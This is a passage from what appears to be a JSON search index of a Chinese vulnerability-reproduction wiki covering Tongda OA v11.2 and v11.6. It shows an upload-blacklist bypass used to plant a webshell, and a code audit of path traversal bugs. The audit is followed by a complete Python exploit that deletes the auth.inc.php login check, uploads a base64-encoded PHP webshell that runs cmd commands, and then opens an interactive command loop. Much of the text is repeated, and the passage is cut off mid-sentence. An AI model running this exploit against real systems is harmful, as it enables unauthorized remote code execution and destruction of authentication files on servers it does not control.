v11.2\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.2%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u901a\u8fbeOA v11.2\u540e\u53f0\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u5141\u8bb8\u901a\u8fc7\u7ed5\u8fc7\u9ed1\u540d\u5355\u7684\u65b9\u6cd5\u6765\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u88ab\u653b\u51fb","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.2%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u901a\u8fbeOA v11.2","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.2%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"\u901a\u8fbeOA v11.2\u4e0b\u8f7d\u94fe\u63a5 \u4e0b\u8f7d\u540e\u6309\u6b65\u9aa4\u5b89\u88c5\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.2%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8e\u540e\u53f0\uff0c\u9700\u8981\u901a\u8fc7\u767b\u5f55\u540e\u624d\u80fd\u8fdb\u884c\u4f7f\u7528 \u767b\u5f55\u540e\u70b9\u51fb \u83dc\u5355 -> \u7cfb\u7edf\u7ba1\u7406 -> \u9644\u4ef6\u7ba1\u7406 \u70b9\u51fb\u6dfb\u52a0\u9644\u5f55\u5b58\u50a8\u7ba1\u7406\u6dfb\u52a0\u5982\u4e0b(\u5b58\u50a8\u76ee\u5f55\u4e3a webroot \u76ee\u5f55\uff0c\u9ed8\u8ba4\u4e3a D:/MYOA/webroot/ ) \u70b9\u51fb \u7ec4\u7ec7 -> \u7cfb\u7edf\u7ba1\u7406\u5458 -> \u4e0a\u4f20\u9644\u4ef6 \u6293\u5305\u4f7f\u7528 windows \u7684\u7ed5\u8fc7\u65b9\u6cd5 shell.php -> shell.php. [!NOTE] 2012 \u4e3a\u76ee\u5f55 1717872192 \u4e3a\u62fc\u63a5\u7684\u6587\u4ef6\u540d \u6700\u540e\u7684shell\u540d\u5b57\u4e3a 1717872192.shell.php \u8bbf\u95ee\u6728\u9a6c\u6587\u4ef6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26RCE/","text":"\u901a\u8fbeOA v11.6 \u4efb\u610f\u6587\u4ef6\u5220\u9664&RCE \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u901a\u8fc7\u4efb\u610f\u6587\u4ef6\u6f0f\u6d1e\u5220\u9664\u4e0a\u4f20\u70b9\u5305\u542b\u7684\u8eab\u4efd\u9a8c\u8bc1\u6587\u4ef6\uff0c\u4ece\u800c\u9020\u6210\u672a\u6388\u6743\u8bbf\u95ee\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u901a\u8fbeOA v11.6 \u73af\u5883\u642d\u5efa \u00b6 \u901a\u8fbeOA v11.6\u4e0b\u8f7d\u94fe\u63a5 \u4e0b\u8f7d\u5b8c\u6bd5\u70b9\u51fb\u5b89\u88c5\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4f7f\u7528\u89e3\u5bc6\u5de5\u5177 SeayDzend(zend\u89e3\u5bc6\u5de5\u5177) \u5bf9\u901a\u8fbeOA\u7684\u52a0\u5bc6\u4ee3\u7801\u8fdb\u884c\u89e3\u5bc6 [!NOTE] \u89e3\u5bc6\u5de5\u5177\u5df2\u7ecf\u653e\u5728\u76ee\u5f55\u4e0b\u7684POC\u76ee\u5f55\u4e2d \u89e3\u5bc6\u5b8c\u6210\u540e\u67e5\u770b webroot\\general\\data_center\\utils\\upload.php \u6587\u4ef6 <?php include_once \"inc/auth.inc.php\" ; include_once \"./utils.func.php\" ; $HTML_PAGE_TITLE = _ ( \"\u4e0a\u4f20\u6587\u4ef6\" ); include_once \"inc/header.inc.php\" ; $error = \"\" ; $msg = \"\" ; if ( $action == \"upload\" ) { if ( $filetype == \"xls\" ) { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/templates/\" ; if ( ! is_dir ( MYOA_ATTACH_PATH . \"/data_center/templates\" )) { if ( ! is_dir ( MYOA_ATTACH_PATH . \"/data_center\" )) { mkdir ( MYOA_ATTACH_PATH . \"/data_center\" ); } mkdir ( MYOA_ATTACH_PATH . \"/data_center/templates\" ); } if ( move_uploaded_file ( $_FILES [ \"FILE1\" ][ \"tmp_name\" ], $uploaddir . $_FILES [ \"FILE1\" ][ \"name\" ])) { } } else if ( $filetype == \"img\" ) { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/images/\" ; if ( ! is_dir ( MYOA_ATTACH_PATH . \"/data_center/images\" )) { if ( ! is_dir ( MYOA_ATTACH_PATH . \"/data_center\" )) { mkdir ( MYOA_ATTACH_PATH . \"/data_center\" ); } mkdir ( MYOA_ATTACH_PATH . \"/data_center/images\" ); } $s_n = $_FILES [ \"FILE1\" ][ \"name\" ]; if ( $s_n [ 0 ] != \"{\" ) { $p = strrpos ( $s_n , \".\" ); $s_n = CreateId () . substr ( $s_n , $p ); } if ( move_uploaded_file ( $_FILES [ \"FILE1\" ][ \"tmp_name\" ], $uploaddir . $s_n )) { } } else { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/attachment/\" ; if ( ! is_dir ( MYOA_ATTACH_PATH . \"/data_center/attachment\" )) { if ( ! is_dir ( MYOA_ATTACH_PATH . \"/data_center\" )) { mkdir ( MYOA_ATTACH_PATH . \"/data_center\" ); } mkdir ( MYOA_ATTACH_PATH . \"/data_center/attachment\" ); } if ( isset ( $from_rep )) { if (( $from_rep != \"\" ) && ( $from_rep [ 0 ] == \"{\" )) { $repkid = GetRepKIDBySendId ( $from_rep ); if ( $repkid != $to_rep ) { if ( file_exists ( $uploaddir . \"/\" . $repkid . \"_\" . $filename )) { copy ( $uploaddir . \"/\" . $repkid . \"_\" . $filename , $uploaddir . \"/\" . $to_rep . \"_\" . $filename ); } } } else { $arr = explode ( \",\" , $from_rep ); for ( $i = 0 ; $i < count ( $arr ); $i ++ ) { $p = strpos ( $arr [ $i ], \".\" ); $repno = substr ( $arr [ $i ], 0 , $p ); $repkid = GetRepKIDByNo ( $repno ); if ( $repkid != $to_rep ) { if ( file_exists ( $uploaddir . \"/\" . $repkid . \"_\" . $filename )) { copy ( $uploaddir . \"/\" . $repkid . \"_\" . $filename , $uploaddir . \"/\" . $to_rep . \"_\" . $filename ); break ; } } } } } else { $s_n = $_FILES [ \"FILE1\" ][ \"name\" ]; if ( $s_n [ 0 ] != \"{\" ) { $s_n = $repkid . \"_\" . $s_n ; } if ( move_uploaded_file ( $_FILES [ \"FILE1\" ][ \"tmp_name\" ], $uploaddir . $s_n )) { } } } @ unlink ( $_FILES [ \"FILE1\" ]); } else if ( $action == \"unupload\" ) { if ( $filetype == \"xls\" ) { $uploaddir = MYOA_ATTACH_PATH . \"data_center/attachment/\" . trim ( $filename ) . \".xls\" ; if ( is_file ( $uploaddir )) { unlink ( $uploaddir ); } } else if ( $filetype == \"img\" ) { $uploaddir = MYOA_ATTACH_PATH . \"data_center/images/\" . trim ( $filename ); if ( is_file ( $uploaddir )) { unlink ( $uploaddir ); } } else if ( $filetype == \"attach\" ) { $uploaddir = MYOA_ATTACH_PATH . \"data_center/attachment/\" . trim ( $filename ); if ( is_file ( $uploaddir )) { unlink ( $uploaddir ); } } } echo \"{\" ; echo \"new_name:' $s_n ', \\n \" ; echo \"error: '\" . $error . \"', \\n \" ; echo \"msg: '\" . $msg . \"' \\n \" ; echo \"}\" ; echo \"<body> \\r\\n </body> \\r\\n </html>\" ; ?> \u5728\u7b2c\u4e00\u884c\u5305\u542b\u4e86\u6587\u4ef6 auth.inc.php include_once \"inc/auth.inc.php\"; \u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u6587\u4ef6\u7528\u4e8e\u68c0\u9a8c\u662f\u5426\u767b\u5f55\uff0c\u672a\u767b\u5f55\u7684\u60c5\u51b5\u65e0\u6cd5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e \u67e5\u770b **\\webroot\\module\\appbuilder\\assets\\print.php**\u6587\u4ef6 <?php $s_tmp = __DIR__ . \"/../../../../logs/appbuilder/logs\" ; $s_tmp .= \"/\" . $_GET [ \"guid\" ]; if ( file_exists ( $s_tmp )) { $arr_data = unserialize ( file_get_contents ( $s_tmp )); unlink ( $s_tmp ); $s_user = $arr_data [ \"user\" ]; } else { echo \"\u672a\u77e5\u53c2\u6570\" ; exit (); } \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230 \u9875\u9762\u83b7\u53d6 guid\u53c2\u6570\u7684\u503c \u4f7f\u7528**file_exists\u51fd\u6570**\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728 \u5e76\u672a\u8fdb\u884c\u6821\u9a8c \u5c31\u6267\u884cunlink\u5220\u9664\u6587\u4ef6 \u53ef\u4ee5\u672c\u5730\u5728 \\webroot\\inc \u76ee\u5f55\u521b\u5efa 1.txt \u6587\u4ef6 \u7136\u540e\u8bbf\u95ee http://xxx.xxx.xxx.xxx/module/appbuilder/assets/print.php?guid=../../../webroot/inc/1.txt \u5c31\u4f1a\u5220\u9664\u8fd9\u4e2a 1.txt \u6587\u4ef6\uff0c\u4e5f\u4ee3\u8868\u53ef\u4ee5\u5220\u9664 auth.inc.php \u767b\u5f55\u68c0\u9a8c\u6587\u4ef6 \u56de\u5230 upload.php \u6587\u4ef6\u8fdb\u884c\u4ee3\u7801\u5ba1\u8ba1 \u5224\u65ad\u53d8\u91cf $action \u662f\u5426\u4e3a upload\uff0c\u518d\u5224\u65ad\u6587\u4ef6\u7c7b\u578b\uff0c\u5982\u679c\u4e0d\u4e3a xls \u548c img \u5219\u8fdb\u5165else\u5206\u652f else { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/attachment/\"; if (!is_dir(MYOA_ATTACH_PATH . \"/data_center/attachment\")) { if (!is_dir(MYOA_ATTACH_PATH . \"/data_center\")) { mkdir(MYOA_ATTACH_PATH . \"/data_center\"); } mkdir(MYOA_ATTACH_PATH . \"/data_center/attachment\"); } if (isset($from_rep)) { if (($from_rep != \"\") && ($from_rep[0] == \"{\")) { $repkid = GetRepKIDBySendId($from_rep); if ($repkid != $to_rep) { if (file_exists($uploaddir . \"/\" . $repkid . \"_\" . $filename)) { copy($uploaddir . \"/\" . $repkid . \"_\" . $filename, $uploaddir . \"/\" . $to_rep . \"_\" . $filename); } } } else { $arr = explode(\",\", $from_rep); for ($i = 0; $i < count($arr); $i++) { $p = strpos($arr[$i], \".\"); $repno = substr($arr[$i], 0, $p); $repkid = GetRepKIDByNo($repno); if ($repkid != $to_rep) { if (file_exists($uploaddir . \"/\" . $repkid . \"_\" . $filename)) { copy($uploaddir . \"/\" . $repkid . \"_\" . $filename, $uploaddir . \"/\" . $to_rep . \"_\" . $filename); break; } } } } } else { $s_n = $_FILES[\"FILE1\"][\"name\"]; if ($s_n[0] != \"{\") { $s_n = $repkid . \"_\" . $s_n; } if (move_uploaded_file($_FILES[\"FILE1\"][\"tmp_name\"], $uploaddir . $s_n)) { } } } @unlink($_FILES[\"FILE1\"]); } \u5728\u8fd9\u6bb5\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u4e0d\u5b58\u5728 $from_rep \u53d8\u91cf\u5219\u4f1a\u8df3\u5230\u5982\u4e0b\u4ee3\u7801 else { $s_n = $_FILES[\"FILE1\"][\"name\"]; if ($s_n[0] != \"{\") { $s_n = $repkid . \"_\" . $s_n; } if (move_uploaded_file($_FILES[\"FILE1\"][\"tmp_name\"], $uploaddir . $s_n)) { } } \u8fd9\u91cc\u76f4\u63a5\u5c06 $repkid \u53d8\u91cf\u8fdb\u884c\u62fc\u63a5,\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u901a\u8fc7\u76ee\u5f55\u7a7f\u8d8a\u6765\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\u5230\u6307\u5b9a\u76ee\u5f55 [!NOTE] \u8fd9\u91cc\u9700\u8981\u5229\u7528file_exists\u51fd\u6570\u7684\u6f0f\u6d1e\u6784\u9020/.<>./.<>./.<>./ \u9003\u9038\u51fa\u6765 \u4f7f\u7528POC\u6765\u5229\u7528\u6f0f\u6d1e [!NOTE] \u6ce8\u610f\u5728\u5220\u9664\u9a8c\u8bc1\u8eab\u4efd\u7684\u6587\u4ef6\u540e\uff0c\u4f1a\u9020\u6210\u540e\u53f0\u9875\u9762\u51fa\u73b0\u5982\u4e0b\u56fe\uff0c\u4f7f\u7528\u524d\u5907\u4efd\u6587\u4ef6 \u6f0f\u6d1e\u5229\u7528POC \u00b6 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import base64 import sys def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u901a\u8fbeOA v11.6 \u4efb\u610f\u6587\u4ef6\u5220\u9664&RCE \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): check_url = target_url + \"/module/appbuilder/assets/print.php\" try : check_url_response = requests . get ( url = check_url ) if check_url_response . status_code == 200 : print ( \" \\033 [32m[o] \u5b58\u5728 /module/appbuilder/assets/print.php \u53ef\u80fd\u542b\u6709\u901a\u8fbeOA v11.6 \u4efb\u610f\u6587\u4ef6\u5220\u9664&RCE\u6f0f\u6d1e \\033 [0m\" ) input ( \" \\033 [32m[o] \u6b64\u6f0f\u6d1e\u4f1a\u5bf9\u771f\u5b9e\u73af\u5883\u9020\u6210\u5f71\u54cd\uff0c\u8bf7\u5728\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u6309\u4e0b\u4efb\u610f\u952e\u7ee7\u7eed..... \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u4e0d\u5b58\u5728 /module/appbuilder/assets/print.php \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) def POC_2 ( target_url ): unlink_url = target_url + \"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\" try : unlink_response = requests . get ( url = unlink_url ) if unlink_response . status_code == 200 : print ( \" \\033 [32m[o] \u6210\u529f\u5220\u9664\u6821\u9a8c\u6587\u4ef6 auth.inc.php \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u5220\u9664\u6821\u9a8c\u6587\u4ef6 auth.inc.php \u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) def POC_3 ( target_url , payload_php ): \"\"\" (\u7ed5\u8fc7\u7684webshell) <?php $command=$_GET['peiqi']; $wsh = new COM('WScript.shell'); $exec = $wsh->exec(\"cmd /c \".$command); $stdout = $exec->StdOut(); $stroutput = $stdout->ReadAll(); echo $stroutput; ?> \"\"\" vuln_url = target_url + \"/general/data_center/utils/upload.php?action=upload&filetype=peiqi&repkid=/.<>./.<>./.<>./\" files = { 'FILE1' : ( 'peiqi.php' , payload_php )} try : vuln_response = requests . post ( url = vuln_url , files = files ) if vuln_response . status_code == 200 : print ( \" \\033 [32m[o] \u6210\u529f\u5199\u5165webshell\u6587\u4ef6: _peiqi.php \\033 [0m\" ) print ( \" \\033 [32m[o] webshell\u5730\u5740\u4e3a: {} /_peiqi.php \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u5199\u5165webshell\u6587\u4ef6\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) def POC_4 ( target_url , cmd ): cmd_url = target_url + \"/_peiqi.php?peiqi= {} \" . format ( cmd ) try : cmd_response = requests . get ( url = cmd_url ) if cmd_response . status_code == 200 : print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884c\u547d\u4ee4: {} \\033 [0m\" . format ( cmd_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( cmd_response . text )) else : print ( \" \\033 [31m[x] \u547d\u4ee4\u6267\u884c\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) POC_2 ( target_url ) payload_php = base64 . b64decode ( \"PD9waHAKICAgICRjb21tYW5kPSRfR0VUWydwZWlxaSddOwogICAgJHdzaCA9IG5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTsKICAgICRleGVjID0gJHdzaC0+ZXhlYygiY21kIC9jICIuJGNvbW1hbmQpOwogICAgJHN0ZG91dCA9ICRleGVjLT5TdGRPdXQoKTsKICAgICRzdHJvdXRwdXQgPSAkc3Rkb3V0LT5SZWFkQWxsKCk7CiAgICBlY2hvICRzdHJvdXRwdXQ7Cj8+\" ) . decode ( \"utf-8\" ) POC_3 ( target_url , payload_php ) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_4 ( target_url , cmd )","title":"\u901a\u8fbeOA v11.6 \u4efb\u610f\u6587\u4ef6\u5220\u9664&RCE"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26RCE/#\u901a\u8fbeoa-v116-\u4efb\u610f\u6587\u4ef6\u5220\u9664rce","text":"","title":"\u901a\u8fbeOA v11.6 \u4efb\u610f\u6587\u4ef6\u5220\u9664&amp;RCE"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26RCE/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u901a\u8fc7\u4efb\u610f\u6587\u4ef6\u6f0f\u6d1e\u5220\u9664\u4e0a\u4f20\u70b9\u5305\u542b\u7684\u8eab\u4efd\u9a8c\u8bc1\u6587\u4ef6\uff0c\u4ece\u800c\u9020\u6210\u672a\u6388\u6743\u8bbf\u95ee\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26RCE/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u901a\u8fbeOA v11.6","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26RCE/#\u73af\u5883\u642d\u5efa","text":"\u901a\u8fbeOA v11.6\u4e0b\u8f7d\u94fe\u63a5 \u4e0b\u8f7d\u5b8c\u6bd5\u70b9\u51fb\u5b89\u88c5\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%26RCE/#\u6f0f\u6d1e\u590d\u73b0","text":"\u4f7f\u7528\u89e3\u5bc6\u5de5\u5177 SeayDzend(zend\u89e3\u5bc6\u5de5\u5177) \u5bf9\u901a\u8fbeOA\u7684\u52a0\u5bc6\u4ee3\u7801\u8fdb\u884c\u89e3\u5bc6 [!NOTE] \u89e3\u5bc6\u5de5\u5177\u5df2\u7ecf\u653e\u5728\u76ee\u5f55\u4e0b\u7684POC\u76ee\u5f55\u4e2d \u89e3\u5bc6\u5b8c\u6210\u540e\u67e5\u770b webroot\\general\\data_center\\utils\\upload.php \u6587\u4ef6 <?php include_once \"inc/auth.inc.php\" ; include_once \"./utils.func.php\" ; $HTML_PAGE_TITLE = _ ( \"\u4e0a\u4f20\u6587\u4ef6\" ); include_once \"inc/header.inc.php\" ; $error = \"\" ; $msg = \"\" ; if ( $action == \"upload\" ) { if ( $filetype == \"xls\" ) { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/templates/\" ; if ( ! is_dir ( MYOA_ATTACH_PATH . \"/data_center/templates\" )) { if ( ! is_dir ( MYOA_ATTACH_PATH . \"/data_center\" )) { mkdir ( MYOA_ATTACH_PATH . \"/data_center\" ); } mkdir ( MYOA_ATTACH_PATH . \"/data_center/templates\" ); } if ( move_uploaded_file ( $_FILES [ \"FILE1\" ][ \"tmp_name\" ], $uploaddir . $_FILES [ \"FILE1\" ][ \"name\" ])) { } } else if ( $filetype == \"img\" ) { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/images/\" ; if ( ! is_dir ( MYOA_ATTACH_PATH . \"/data_center/images\" )) { if ( ! is_dir ( MYOA_ATTACH_PATH . \"/data_center\" )) { mkdir ( MYOA_ATTACH_PATH . \"/data_center\" ); } mkdir ( MYOA_ATTACH_PATH . \"/data_center/images\" ); } $s_n = $_FILES [ \"FILE1\" ][ \"name\" ]; if ( $s_n [ 0 ] != \"{\" ) { $p = strrpos ( $s_n , \".\" ); $s_n = CreateId () . substr ( $s_n , $p ); } if ( move_uploaded_file ( $_FILES [ \"FILE1\" ][ \"tmp_name\" ], $uploaddir . $s_n )) { } } else { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/attachment/\" ; if ( ! is_dir ( MYOA_ATTACH_PATH . \"/data_center/attachment\" )) { if ( ! is_dir ( MYOA_ATTACH_PATH . \"/data_center\" )) { mkdir ( MYOA_ATTACH_PATH . \"/data_center\" ); } mkdir ( MYOA_ATTACH_PATH . \"/data_center/attachment\" ); } if ( isset ( $from_rep )) { if (( $from_rep != \"\" ) && ( $from_rep [ 0 ] == \"{\" )) { $repkid = GetRepKIDBySendId ( $from_rep ); if ( $repkid != $to_rep ) { if ( file_exists ( $uploaddir . \"/\" . $repkid . \"_\" . $filename )) { copy ( $uploaddir . \"/\" . $repkid . \"_\" . $filename , $uploaddir . \"/\" . $to_rep . \"_\" . $filename ); } } } else { $arr = explode ( \",\" , $from_rep ); for ( $i = 0 ; $i < count ( $arr ); $i ++ ) { $p = strpos ( $arr [ $i ], \".\" ); $repno = substr ( $arr [ $i ], 0 , $p ); $repkid = GetRepKIDByNo ( $repno ); if ( $repkid != $to_rep ) { if ( file_exists ( $uploaddir . \"/\" . $repkid . \"_\" . $filename )) { copy ( $uploaddir . \"/\" . $repkid . \"_\" . $filename , $uploaddir . \"/\" . $to_rep . \"_\" . $filename ); break ; } } } } } else { $s_n = $_FILES [ \"FILE1\" ][ \"name\" ]; if ( $s_n [ 0 ] != \"{\" ) { $s_n = $repkid . \"_\" . $s_n ; } if ( move_uploaded_file ( $_FILES [ \"FILE1\" ][ \"tmp_name\" ], $uploaddir . $s_n )) { } } } @ unlink ( $_FILES [ \"FILE1\" ]); } else if ( $action == \"unupload\" ) { if ( $filetype == \"xls\" ) { $uploaddir = MYOA_ATTACH_PATH . \"data_center/attachment/\" . trim ( $filename ) . \".xls\" ; if ( is_file ( $uploaddir )) { unlink ( $uploaddir ); } } else if ( $filetype == \"img\" ) { $uploaddir = MYOA_ATTACH_PATH . \"data_center/images/\" . trim ( $filename ); if ( is_file ( $uploaddir )) { unlink ( $uploaddir ); } } else if ( $filetype == \"attach\" ) { $uploaddir = MYOA_ATTACH_PATH . \"data_center/attachment/\" . trim ( $filename ); if ( is_file ( $uploaddir )) { unlink ( $uploaddir ); } } } echo \"{\" ; echo \"new_name:' $s_n ', \\n \" ; echo \"error: '\" . $error . \"', \\n \" ; echo \"msg: '\" . $msg . \"' \\n \" ; echo \"}\" ; echo \"<body> \\r\\n </body> \\r\\n </html>\" ; ?> \u5728\u7b2c\u4e00\u884c\u5305\u542b\u4e86\u6587\u4ef6 auth.inc.php include_once \"inc/auth.inc.php\"; \u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u6587\u4ef6\u7528\u4e8e\u68c0\u9a8c\u662f\u5426\u767b\u5f55\uff0c\u672a\u767b\u5f55\u7684\u60c5\u51b5\u65e0\u6cd5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e \u67e5\u770b **\\webroot\\module\\appbuilder\\assets\\print.php**\u6587\u4ef6 <?php $s_tmp = __DIR__ . \"/../../../../logs/appbuilder/logs\" ; $s_tmp .= \"/\" . $_GET [ \"guid\" ]; if ( file_exists ( $s_tmp )) { $arr_data = unserialize ( file_get_contents ( $s_tmp )); unlink ( $s_tmp ); $s_user = $arr_data [ \"user\" ]; } else { echo \"\u672a\u77e5\u53c2\u6570\" ; exit (); } \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230 \u9875\u9762\u83b7\u53d6 guid\u53c2\u6570\u7684\u503c \u4f7f\u7528**file_exists\u51fd\u6570**\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728 \u5e76\u672a\u8fdb\u884c\u6821\u9a8c \u5c31\u6267\u884cunlink\u5220\u9664\u6587\u4ef6 \u53ef\u4ee5\u672c\u5730\u5728 \\webroot\\inc \u76ee\u5f55\u521b\u5efa 1.txt \u6587\u4ef6 \u7136\u540e\u8bbf\u95ee http://xxx.xxx.xxx.xxx/module/appbuilder/assets/print.php?guid=../../../webroot/inc/1.txt \u5c31\u4f1a\u5220\u9664\u8fd9\u4e2a 1.txt \u6587\u4ef6\uff0c\u4e5f\u4ee3\u8868\u53ef\u4ee5\u5220\u9664 auth.inc.php \u767b\u5f55\u68c0\u9a8c\u6587\u4ef6 \u56de\u5230 upload.php 